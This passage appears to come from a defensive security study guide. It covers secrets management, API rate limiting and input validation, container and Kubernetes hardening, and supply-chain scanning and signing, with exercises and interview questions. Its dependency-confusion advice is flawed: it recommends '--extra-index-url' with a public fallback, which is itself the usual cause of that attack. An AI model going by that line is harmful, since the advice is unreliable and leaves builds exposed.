> ⚠️ **Warning:** If you accidentally commit a secret, changing it in a new commit is NOT enough — you must rotate the secret and purge it from git history. Attackers scan public repos for secrets in commit history. Use `git filter-branch` or `BFG Repo-Cleaner` to remove secrets from history, then force-push.

> ✅ **Best Practice:** Use a secrets management tool (Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager) as the single source of truth for all secrets. Never copy secrets into .env files that get checked into repos or shared via insecure channels (Slack, email). Rotate secrets automatically every 90 days.

### Real World Analogy: The Hotel Safe Deposit Box

Secrets management is like a hotel's safe deposit box system:
- **Vault** = The main hotel vault with numbered boxes. You don't carry the box contents — you ask the front desk to retrieve them when needed.
- **Environment Variables** = A slip of paper in the hotel room safe — convenient for things you need at runtime, but terrible for storing the master key to the whole hotel.
- **AWS Secrets Manager** = An automated safe deposit system where the hotel rotates the lock combination every 90 days.
- **SOPS** = A tamper-evident envelope — you can see if someone opened it, but the contents still need protection.
- **Git Secrets** = The security camera that catches employees leaving safe deposit keys lying around.

### Practical Exercises

1. **Vault Setup**: Run HashiCorp Vault in dev mode locally, store a database password, and retrieve it from a Python app using the hvac library
2. **Secret Rotation**: Write a script that rotates an AWS Secrets Manager secret every 30 days and verifies the old secret no longer works
3. **Git History Scan**: Run truffleHog or Gitleaks on a test repository with intentionally committed secrets and practice removing them from git history with BFG
4. **SOPS + Age**: Encrypt a Kubernetes secret manifest with SOPS using age keys, commit it safely to a repo, and decrypt it during CI/CD

### Revision Notes

- Never store secrets in code, config files committed to git, or environment variables of CI/CD systems (unless encrypted)
- HashiCorp Vault is the industry standard for secrets management — supports dynamic secrets (auto-expiring), leasing, and auditing
- AWS Secrets Manager, Azure Key Vault, and GCP Secret Manager offer managed alternatives with IAM integration
- `.env` files are acceptable for local development but should never be committed to version control
- Use `.sops.yaml` to define encryption rules so that specific files are auto-encrypted when committed

---

## Chapter 10: API Security

### Rate Limiting

```python
# Token bucket rate limiter
import time
from collections import defaultdict

class TokenBucket:
    def __init__(self, rate: float, capacity: int):
        self.rate = rate
        self.capacity = capacity
        self.tokens = defaultdict(lambda: capacity)
        self.last_refill = defaultdict(time.monotonic)

    def consume(self, key: str, tokens: int = 1) -> bool:
        now = time.monotonic()
        refill = (now - self.last_refill[key]) * self.rate
        self.tokens[key] = min(self.capacity, self.tokens[key] + refill)
        self.last_refill[key] = now
        if self.tokens[key] >= tokens:
            self.tokens[key] -= tokens
            return True
        return False

# Usage in FastAPI
limiter = TokenBucket(rate=10, capacity=20)  # 10 req/sec, burst to 20

@app.post("/api/login")
def login(request: Request):
    client_ip = request.client.host
    if not limiter.consume(client_ip):
        raise HTTPException(status_code=429, detail="Rate limit exceeded")
    # process login...
```

### Input Validation

```python
from pydantic import BaseModel, Field, EmailStr, validator
import re

class UserRegistration(BaseModel):
    email: EmailStr
    username: str = Field(min_length=3, max_length=30, pattern=r"^[a-zA-Z0-9_]+$")
    password: str = Field(min_length=12)

    @validator("password")
    def password_strength(cls, v):
        if not re.search(r"[A-Z]", v):
            raise ValueError("Password must contain an uppercase letter")
        if not re.search(r"[a-z]", v):
            raise ValueError("Password must contain a lowercase letter")
        if not re.search(r"\d", v):
            raise ValueError("Password must contain a digit")
        if not re.search(r"[!@#$%^&*]", v):
            raise ValueError("Password must contain a special character")
        return v
```

### API Key Management

```python
import hashlib
import secrets

# Generate API key
def generate_api_key():
    raw_key = f"sk-{secrets.token_urlsafe(32)}"
    hashed_key = hashlib.sha256(raw_key.encode()).hexdigest()
    return raw_key, hashed_key  # Return raw key once, store hash

# Store hashed key in DB: INSERT INTO api_keys (key_hash, user_id, permissions)
# To verify: hashlib.sha256(provided_key.encode()).hexdigest() == stored_hash
```

> ✅ **Best Practice:** Hash API keys before storing them (like passwords). An attacker who breaches your database should not be able to use stored API keys. Show the full key only once at creation time, and allow users to regenerate keys.

> ❓ **Interview Question:** Your API gateway is being hit by a DDoS attack. Describe how you would implement rate limiting at multiple layers: network, application, and infrastructure. What's the difference between a "soft limit" (warning) and a "hard limit" (block)?

### Practical Exercises

1. **API Gateway**: Build a simple API gateway that validates JWT tokens, enforces rate limits per user, and routes requests to backend services
2. **Input Fuzzing**: Use a fuzzing tool (like `ffuf` or Burp Suite Intruder) to test your API with unexpected inputs — SQL injection payloads, oversized payloads, unicode normalization attacks
3. **API Key Rotation**: Implement an API key rotation system where old keys remain valid for a 24-hour grace period after issuance of a new key

### Revision Notes

- Rate limiting should be applied at multiple layers: CDN, API gateway, application
- Token bucket and leaky bucket are the most common rate-limiting algorithms
- Always validate, sanitize, and type-check all API inputs — never trust client data
- API keys should be hashed (SHA-256) in the database, never stored in plaintext
- Use structured error responses that don't leak implementation details

---

## Chapter 11: Container Security

### Docker Security

```dockerfile
# Multi-stage build reduces attack surface
FROM python:3.12-slim AS builder
COPY requirements.txt .
RUN pip install --user -r requirements.txt

FROM python:3.12-slim
# Run as non-root user
RUN groupadd -r appuser && useradd -r -g appuser appuser

# Copy only artifacts from builder
COPY --from=builder /root/.local /home/appuser/.local
COPY --chown=appuser:appuser app /app

# Set secure defaults
ENV PATH="/home/appuser/.local/bin:${PATH}"
USER appuser
WORKDIR /app

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD curl -f http://localhost:8080/health || exit 1

EXPOSE 8080
CMD ["python", "app.py"]
```

### Image Scanning

```bash
# Trivy vulnerability scanner
docker run aquasec/trivy image --severity HIGH,CRITICAL myapp:latest

# Scan locally built image
trivy image --severity CRITICAL --ignore-unfixed myapp:latest

# Docker Scout (built into Docker Desktop)
docker scout quickview myapp:latest
```

### Kubernetes Security

```yaml
# Pod Security Context
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "512Mi"
        cpu: "500m"
```

> ⚠️ **Warning:** Running containers as root is one of the most common Kubernetes security mistakes. If an attacker compromises your container, they have root access on the host kernel (unless you've configured user namespace remapping). Always specify `runAsNonRoot: true` and drop all capabilities.

> 💡 **Pro Tip:** Use a **distroless base image** (`gcr.io/distroless/base`) for production containers. Distroless images contain only your application and its runtime dependencies — no shell, no package manager, no utilities. This reduces the attack surface dramatically (no curl, bash, or apt to exploit) and lowers the number of CVEs.

### Practical Exercises

1. **Dockerfile Hardening**: Take an existing Dockerfile and apply security best practices: non-root user, multi-stage build, minimal base image, HEALTHCHECK, and no sensitive ARG leaks
2. **Image Scanning Pipeline**: Integrate Trivy into a GitHub Actions workflow that fails the build if CRITICAL vulnerabilities are found
3. **K8s Network Policy**: Write a Kubernetes NetworkPolicy that allows traffic only from the ingress controller and blocks all other inbound connections

### Revision Notes

- Run containers as non-root with read-only root filesystem
- Use minimal base images (distroless, alpine-slim)
- Scan images for vulnerabilities in CI/CD, not just at deploy
- Kubernetes Pod Security Standards (Baseline, Restricted) replace deprecated PSPs
- Network policies are the first line of defense for microservice segmentation
- Secrets in K8s should use external secrets operators (External Secrets Operator, CSI driver)

---

## Chapter 12: Supply Chain Security

### Dependency Scanning

```bash
# OWASP Dependency-Check (Java/Node/Python)
dependency-check --scan . --format HTML --out reports

# npm audit
npm audit --audit-level=high

# pip-audit
pip-audit

# Safety (Python)
safety check -r requirements.txt
```

### SBOM (Software Bill of Materials)

```bash
# Generate SPDX SBOM with Syft
syft packages myapp:latest -o spdx-json > sbom.spdx.json

# Generate CycloneDX SBOM
syft packages myapp:latest -o cyclonedx-json > sbom.cyclonedx.json

# Sign SBOM with cosign
cosign sign-blob --key cosign.key sbom.cyclonedx.json > sbom.cyclonedx.json.sig
```

### Dependency Confusion Prevention

```python
# In requirements.txt, pin exact versions with hash verification
requests==2.31.0 --hash=sha256:abc123...
pydantic==2.5.0 --hash=sha256:def456...

# Use private package index explicitly
pip install --index-url https://private-pypi.example.com/simple/ --extra-index-url https://pypi.org/simple/ my-package
```

> ⚠️ **Warning:** Dependency confusion attacks exploit the fact that pip (and npm) will use the package with the highest version number from any configured registry. An attacker can publish a public package with the same name as your private internal package but a higher version. Always use `--extra-index-url` and pin private registries as the primary source.

> ✅ **Best Practice:** Implement a software supply chain security policy:
> 1. Generate SBOMs for all container images and build artifacts
> 2. Scan dependencies in CI/CD before every build
> 3. Sign artifacts with cosign (part of Sigstore)
> 4. Pin dependency versions with hash verification
> 5. Use Dependabot/Renovate for automated patch updates
> 6. Monitor CVE feeds for your critical dependencies

### Practical Exercises

1. **SBOM Generation**: Run Syft on a container image and inspect the generated SBOM — identify all dependencies and their versions
2. **Dependency Scan**: Run `npm audit` or `pip-audit` on a real project, identify vulnerable dependencies, and create a plan to upgrade them
3. **Sigstore Signing**: Install cosign, generate a key pair, sign a container image, and verify the signature
4. **Dependabot Config**: Create a `.github/dependabot.yml` file that enables automated security updates for npm, pip, and Docker dependencies

### Revision Notes

- Supply chain attacks are on the rise — SolarWinds, Codecov, log4shell
- SBOM generation should be automated in CI/CD for every build
- Dependency scanning should check for known CVEs (NVD database)
- All third-party code carries risk; minimize dependencies where possible
- Private packages should use scoped names (e.g., `@mycompany/package`) to prevent confusion
- Regular dependency audits should be part of your sprint cycle

---

## Part 17 Revision Notes

### Key Concepts
- OWASP Top 10: access control, crypto, injection, misconfiguration, SSRF
- Authentication: bcrypt/argon2/scrypt hashing, MFA/TOTP, WebAuthn/Passkeys, session management
- Authorization: RBAC (role-based), ABAC (attribute-based), ReBAC (relationship-based), OPA/CASL
- Encryption: AES-GCM, ChaCha20-Poly1305, RSA, ECDSA, Ed25519, TLS 1.3
- JWT: structure (header.payload.signature), RS256/ES256 signing, refresh tokens, blacklisting
- OAuth 2.0: authorization code + PKCE, client credentials, OIDC, scopes
- CORS: same-origin policy, preflight (OPTIONS), allowed origins/headers
- XSS (stored/reflected/DOM), CSRF (SameSite + tokens), SQL Injection (parameterized queries)
- API Security: rate limiting, input validation, API key hashing
- Container Security: non-root users, minimal images, image scanning (Trivy), K8s Pod Security
- Supply Chain Security: SBOM, dependency scanning, software signing (Sigstore/cosign)
- Secrets Management: Vault, cloud secret managers, SOPS, git secrets detection

### Common Mistakes
- Storing passwords in plaintext or weak hashes (MD5, SHA-1)
- Not validating JWT signatures or using "alg: none"
- Overly permissive CORS (allow_origins=["*"]) with credentials
- Not implementing rate limiting on auth and password reset endpoints
- Committing secrets (.env, .pem, credentials.json) to version control
- Running containers as root in production
- Using unsalted hashes or fixed salts for password storage
- Ignoring dependency vulnerabilities (no regular audits)
- Not implementing CSP headers (defense in depth against XSS)
- Using ECB mode for AES encryption

### Key Interview Questions
1. How does OAuth 2.0 authorization code flow work with PKCE?
2. Explain the difference between RBAC and ABAC — when would you use each?
3. When would you use symmetric vs asymmetric encryption?
4. What is the difference between XSS and CSRF? How do you prevent each?
5. How does TLS 1.3 handshake differ from TLS 1.2?
6. What is the JWT algorithm confusion attack and how do you prevent it?
7. How would you design a secret rotation strategy for a microservice architecture?
8. Explain the principle of least privilege in the context of Kubernetes RBAC
9. What is a dependency confusion attack and how do you protect against it?
10. How do SameSite cookies affect CSRF protection?

---
